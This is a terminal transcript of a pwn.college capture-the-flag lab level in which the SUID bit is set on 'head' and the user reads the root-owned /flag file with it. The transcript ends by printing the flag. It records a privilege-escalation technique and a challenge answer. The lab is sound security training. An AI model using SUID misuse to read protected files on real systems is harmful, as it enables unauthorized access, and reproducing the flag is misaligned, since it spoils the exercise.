```bash
hacker@program-misuse-level-5:~$ ls
Desktop
hacker@program-misuse-level-5:~$ cd /
hacker@program-misuse-level-5:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-5:/$ cd challenge/
hacker@program-misuse-level-5:/challenge$ ls
babysuid_level5
hacker@program-misuse-level-5:/challenge$ ./babysuid_level5 
Welcome to ./babysuid_level5!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/head.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/head!
hacker@program-misuse-level-5:/challenge$ head /flag 
pwn.college{AhVsYNi32bAa2PdgR_Ug9aJ1Wgy.01N0EDL0AjNzQzW}
hacker@program-misuse-level-5:/challenge$ 
```